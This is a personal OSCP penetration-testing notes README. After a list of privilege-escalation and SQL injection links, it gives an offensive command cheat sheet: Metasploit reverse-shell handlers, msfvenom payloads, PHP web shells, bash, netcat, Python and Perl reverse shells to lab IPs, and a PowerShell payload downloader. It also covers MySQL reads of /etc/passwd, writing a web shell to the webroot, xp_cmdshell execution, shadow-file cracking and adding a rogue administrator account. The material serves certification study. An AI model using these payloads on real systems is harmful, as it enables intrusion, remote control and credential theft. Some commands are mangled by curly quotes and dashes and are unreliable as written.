# oscp_notes
My Personal OSCP Notes

Welp, just my personal OSCP notes. I am pretty sure these can help you get VERY high score in your exam. So why not try them out?

I am still organizing all my scripts and stuff. Please stay tune to the repo.

## Good Readups
### Linux
[(Outdated) Basic Linux Priviledge Checklist - https://www.blackmoreops.com/2017/01/17/find-linux-exploits-by-kernel-version/](https://www.blackmoreops.com/2017/01/17/find-linux-exploits-by-kernel-version/)

[Basic Linux Priviledge Escalation Checklist - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Exploit SUID/SGID - https://null-byte.wonderhowto.com/how-to/hack-like-pro-finding-potential-suid-sgid-vulnerabilities-linux-unix-systems-0158373/](https://null-byte.wonderhowto.com/how-to/hack-like-pro-finding-potential-suid-sgid-vulnerabilities-linux-unix-systems-0158373/)


### Windows
[Windows Exploit Suggester - https://resources.infosecinstitute.com/windows-exploit-suggester-an-easy-way-to-find-and-exploit-windows-vulnerabilities/](https://resources.infosecinstitute.com/windows-exploit-suggester-an-easy-way-to-find-and-exploit-windows-vulnerabilities/)

[PowerSploit - Post-exploit framework - https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

[nishang - Post-exploit Toolkit - https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

[Some Windows privesc techniques - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)


### Database
[SQL Injection Techniques - https://www.exploit-db.com/docs/41273.pdf](https://www.exploit-db.com/docs/41273.pdf)

[Useful notes - https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)


## Command Notes
### NMap

    # Scanning TCP ports 1 - 65535 + verbose + OS detection + timeout settings + treat all host online
    nmap -v -p- -A -T4 -sV -Pn <IP>


### Metasploit

    # Shell listener for reverse payload (Server side)
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.45.31
    set LPORT 1337
    set ExitOnSession false
    exploit -j -z


### Shellcodes

    # PHP Meterpreter reverse payload
    msfvenom -p php/meterpreter/bind_tcp LHOST=10.11.0.51 LPORT=1337 -f php > meterp.php

    # PHP error display (useful for testing shells)
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);

    # PHP Simple Shell
    <?php echo system($_GET['cmd']);?>
    <?php @system($_GET['c'])?>

    # bash reverse shell
    bash -i >& /dev/tcp/10.11.0.51/1337 0>&1

    # netcat (nc) reverse shell (simple)
    /bin/sh | nc <your IP> <port>

    # netcat (nc) evil reverse shell (require specific version)
    nc -e /bin/bash <your IP> <port>

    # Python reverse shell
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.38.31”,1339));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

    # Perl reverse shell
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.11.1.246:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

    # Python shell construction (useful for TOO simple shell)
    python -c 'import pty;pty.spawn("/bin/bash")'

    # MSSQL No DUMP shell
    DECLARE @c varchar(3000);set @c=0x70696e6731302e31312e302e3531;EXEC master..xp_cmdshell @c--

    # MSSQL DUMP shell
    DECLARE @cVARCHAR(8000);SET @c=0x64697220433a5c;INSERT INTO sqlmapoutput(data) EXEC master…xp_cmdshell @c–

### Payload hosting method

    # Python
    python -m SimpleHTTPServer 8080


### Downloader

    # PowerShell
    powershell “(new-object System.Net.WebClient).DownloadFile(‘http://10.11.0.51:4949/yo.exe’,'yo.exe’)”


### MySQL Techniques
    # Load local file
    LOAD DATA LOCAL INFILE “/etc/passwd” INTO TABLE yolo

    # Clear and Load local file
    TRUNCATE yolo;LOAD DATA LOCAL INFILE “/etc/phpmyadmin/apache.conf” INTO TABLE yolo;

    # Basic into dumpfile
    select “<?php echo system($_GET['cmd']);?>” INTO dumpfile ‘/var/www/html/yolo.php’


### Random Knowledge

    # Mount file system
    mount -t cifs -o user=bob,sec=ntlm,dir_mode=0077 “//10.11.1.136/Bob Share” /mnt/cifs

    # John The Ripper
    unshadow 10.11.1.141_passwd 10.11.1.141_shadow >10.11.1.141_tocrack
    john --word=/usr/share/wordlists/rockyou.txt 10.11.1.141_tocrack --fork=30

    # Windows add new administrator account
    net user yolo whysoserious /add
    net localgroup Administrators yolo /add

    # Find broken UID files
    find / -user root -perm -4000 -exec ls -ldb {} ; > /tmp/uids

    # GCC cross compile
    gcc -m32 -Wl,–hash-style=both -o exploit exploit.c

    # SSH Local Bind Tunnel (Bind 1337 on client (local))
    ssh -L 127.0.0.1:1337:localhost:443 root@victim

    # SSH Remote Bind Tunnel (Bind 1337 on target (remote)) [Useful for tunneling into another network]
    ssh -R 127.0.0.1:1337:10.30.0.3:443 root@victim

    # SSH Dynamic Tunnel (Useful for VPN usage)
    ssh -D9999 root@victim